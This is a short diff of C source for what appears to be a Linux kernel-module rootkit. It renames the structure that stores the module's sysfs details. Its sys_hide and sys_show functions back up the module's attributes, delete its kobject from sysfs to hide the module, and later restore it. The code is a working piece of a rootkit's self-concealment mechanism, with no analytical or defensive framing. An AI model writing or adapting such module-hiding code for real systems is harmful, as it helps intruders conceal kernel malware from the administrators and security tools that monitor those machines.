@@ -101,13 +101,13 @@ error_out:
 }
 
 
-struct rmmod_controller {
+struct restore_info {
     struct kobject *parent;
     struct module_sect_attrs *attrs;
     const char *name;
 };
 
-static struct rmmod_controller rmmod_ctrl;
+static struct restore_info lkm_restore_info;
 //
 //
 //
@@ -156,9 +156,9 @@ static void proc_show(void)
 static void sys_hide(void)
 {
     /** Backup and remove this module from sysfs */
-    rmmod_ctrl.attrs = THIS_MODULE->sect_attrs;
-    rmmod_ctrl.parent = this_kobj->parent;
-    rmmod_ctrl.name = THIS_MODULE->name;
+    lkm_restore_info.attrs = THIS_MODULE->sect_attrs;
+    lkm_restore_info.parent = this_kobj->parent;
+    lkm_restore_info.name = THIS_MODULE->name;
     
     kobject_del(lkm.this_mod->holders_dir->parent);
    
@@ -182,7 +182,7 @@ static void sys_show(void)
 
     
     lkm.this_mod->state = MODULE_STATE_LIVE; // Change module state to normal
-    err = kobject_add(this_kobj, rmmod_ctrl.parent, rmmod_ctrl.name); // Add kobj
+    err = kobject_add(this_kobj, lkm_restore_info.parent, lkm_restore_info.name); // Add kobj
     if (err)
         goto put_kobj;
     
@@ -193,7 +193,7 @@ static void sys_show(void)
     lkm.this_mod->holders_dir = kobj; // Change THIS_MODULE->holders_dir to our newly created kobj
     
     // Create sysfs representation of kernel objects
-    err = sysfs_create_group(this_kobj, &rmmod_ctrl.attrs->grp); 
+    err = sysfs_create_group(this_kobj, &lkm_restore_info.attrs->grp); 
     if (err)
 	goto put_kobj;
     
